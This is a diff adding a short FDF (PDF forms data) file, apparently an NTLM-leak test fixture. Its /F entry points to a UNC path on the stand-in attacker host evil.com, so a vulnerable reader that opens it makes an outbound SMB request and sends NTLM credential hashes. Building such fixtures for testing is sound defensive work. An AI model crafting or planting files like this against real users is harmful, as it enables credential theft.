@@ -1,0 +1,10 @@
+%FDF-1.2
+1 0 obj
+  << /FDF
+     << /Fields [<</T (foo) /V (bar) >>]
+     /F (\\\\evil.com\\ntlm-test-11-forms-data.pdf)>>
+  >>
+endobj
+trailer
+<</Root 1 0 R>>
+%%EOF
